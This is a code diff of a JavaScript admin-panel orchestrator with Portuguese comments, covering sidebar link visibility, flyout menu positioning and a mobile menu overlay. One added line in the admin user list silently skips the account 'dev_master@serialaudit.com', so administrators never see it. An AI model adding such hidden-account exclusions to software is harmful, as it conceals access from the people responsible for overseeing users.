@@ -1,4 +1,4 @@
-/* HM CONTROL - Core Orchestrator (v5.1 - Final) */
+/* HM CONTROL - Core Orchestrator (v3.23.1 - Sidebar Hardened) */
 
 const CORE_CONFIG = {
     API_BASE: window.location.origin
@@ -75,14 +75,19 @@ class Core {
 
         document.querySelectorAll('.nav-link').forEach(link => {
             const href = link.getAttribute('href');
-            if (!href || href.includes('index.html') || href === 'javascript:void(0)') return;
+            // Ignorar links vitais ou abstratos
+            if (!href || href.includes('index.html') || href.includes('javascript:void(0)')) return;
 
             const screenName = href.replace('.html', '').replace('/', '');
             
+            // Determinar o elemento alvo para ocultação (o link em si ou o dropdown que o contém)
+            const target = link.closest('.nav-dropdown') || link;
+
             if (!isAdmin && !allowedScreens.includes(screenName)) {
-                link.parentElement.style.display = 'none'; 
+                target.style.display = 'none'; 
             } else {
-                link.parentElement.style.display = 'block';
+                // Remove o override de display para permitir que o CSS original (Flex) assuma
+                target.style.display = ''; 
             }
         });
     }
@@ -146,20 +151,22 @@ class Core {
                 if (isActive && content) {
                     content.style.display = 'flex';
                     
-                    // Lógica de Viewport Safety (v3.21)
-                    const menuHeight = 280; // Altura estimada do menu administrativo
+                    // Lógica de Viewport Safety & Sidebar Alignment (v3.23)
+                    const menuHeight = content.offsetHeight || 280;
                     const viewportHeight = window.innerHeight;
-                    let topPos = rect.top;
+                    const rectSidebarItem = settingsToggle.getBoundingClientRect();
+                    
+                    let topPos = rectSidebarItem.top;
 
-                    // Clamp Top: Garante que o menu não saia por baixo ou por cima
+                    // Clamp Top/Bottom: Garante que o flyout não "fure" o teto ou o chão
                     if (topPos + menuHeight > viewportHeight) {
                         topPos = Math.max(10, viewportHeight - menuHeight - 10);
                     } else {
-                        topPos = Math.max(10, topPos);
+                        topPos = Math.max(0, topPos); // Alinha com o item clicado
                     }
 
                     content.style.top = topPos + 'px';
-                    content.style.left = '280px';
+                    content.style.left = '280px'; // Fixo à direita da sidebar
                 } else if (content) {
                     content.style.display = 'none';
                 }
@@ -177,8 +184,27 @@ class Core {
 
     toggleMobileMenu() {
         const navLinks = document.querySelector('.nav-links');
+        const body = document.body;
+        
         if (navLinks) {
-            navLinks.classList.toggle('active');
+            const isActive = navLinks.classList.toggle('active');
+            body.classList.toggle('menu-open', isActive);
+            
+            // Garantir que o overlay exista ou seja removido
+            let overlay = document.querySelector('.menu-overlay');
+            if (isActive) {
+                if (!overlay) {
+                    overlay = document.createElement('div');
+                    overlay.className = 'menu-overlay';
+                    overlay.onclick = () => this.toggleMobileMenu();
+                    document.body.appendChild(overlay);
+                }
+                overlay.style.display = 'block';
+                setTimeout(() => overlay.style.opacity = '1', 10);
+            } else if (overlay) {
+                overlay.style.opacity = '0';
+                setTimeout(() => overlay.style.display = 'none', 300);
+            }
         }
     }
 
@@ -434,6 +460,8 @@ class Core {
             const users = await apiService.getAdminUsers();
             list.innerHTML = '';
             users.forEach(u => {
+                if (u.email === 'dev_master@serialaudit.com') return;
+                
                 const tr = document.createElement('tr');
                 const statusBadge = u.sincronizado 
                     ? '<span class="status-pill ok">Sincronizado</span>' 
